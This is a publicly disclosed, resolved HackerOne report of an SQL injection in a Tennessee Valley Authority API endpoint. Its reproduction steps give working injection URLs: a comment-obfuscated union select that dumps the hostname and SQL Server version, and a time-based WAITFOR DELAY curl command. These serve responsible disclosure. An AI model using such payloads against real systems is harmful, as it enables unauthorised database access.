---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/sql-injection
  - env/web
  - vuln/sql-injection
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2022-04-26
submitted: 2021-03-15T08:48:47.169Z
bounty_usd: null
votes: 30
cve: []
program: "[[programs/tennessee-valley-authority|Tennessee Valley Authority]]"
reporter: "yassinek3ch"
source: "https://hackerone.com/reports/1125752"
title: "SQL Injection on https://soa-accp.glbx.tva.gov/ via '/api/' path - VI-21-015"
---
# SQL Injection on https://soa-accp.glbx.tva.gov/ via "/api/" path - VI-21-015

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 30 | **Program:** Tennessee Valley Authority | **Disclosed:** 2022-04-26

- Report: [https://hackerone.com/reports/1125752](https://hackerone.com/reports/1125752)
- CWE: SQL Injection
- Submitted: 2021-03-15T08:48:47.169Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
 
i've found this subdomain ```soa-accp.glbx.tva.gov``` also is vulnerable to SQLI through /api/ path

## Steps To Reproduce:

```https://soa-accp.glbx.tva.gov/api/river/observed-data/GVDA1'+%2f*!50000union*%2f+SELECT+HOST_NAME()--+-``` hostname dumped

```https://soa-accp.glbx.tva.gov/api/river/observed-data/GVDA1'+%2f*!50000union*%2f+SELECT+@@version--+-``` 

Microsoft SQL Server 2017 (RTM-CU22-GDR) (KB4583457) - 14.0.3370.1 (X64) \n\tNov  6 2020 18:19:52 \n\tCopyright (C) 2017 Microsoft Corporation\n\tEnterprise Edition (64-bit) on Windows Server 2012 R2 Standard 6.3 <X64> (Build 9600: ) (Hypervisor)\n

also you can retest it through time bassed trick

```time curl -k "https://soa-accp.glbx.tva.gov/api/river/observed-data/-GVDA1'+WAITFOR+DELAY+'0:0:10'--+-"```

{F1230364}

## Impact

An attacker can manipulate the SQL statements that are sent to the MySQL database and inject malicious SQL statements. The attacker is able to change the logic of SQL statements executed against the database.

## Timeline

- **Report Filed**
- **2021-03-15** @orangeband: Hi @yassinek3ch,

Thank you for your submission. I hope you are well. Your report is currently being reviewed and the HackerOne triage team will get back to you once there is additional information to share.

Have a great day! 

Kind regards,
@orangeband
- **Report Title Updated**
- **Report Severity Updated**
- **Report Triaged**
- **Report Title Updated**
- **Report Retesting**
- **User Completed Retest**
- **2021-03-29** @yassinek3ch: @gleahm
2 sqli is resolved and reports still open ? let me know if you need any help
- **Report Retest Approved**
- **Report Resolved**
- **Agreed On Going Public**
- **2022-01-05** @w4rth0g: sorry for the delay. confirming with our legal team how they want to proceed with approving disclosures.
- **2022-02-01** @yassinek3ch: @w4rth0g Any update?
- **2022-03-16** @gleahm: You should be good to publish. We appreciate your report and patience. Thank you!
- **2022-03-16** @yassinek3ch: Yes thank you!
- **Agreed On Going Public**
- **Report Became Public**
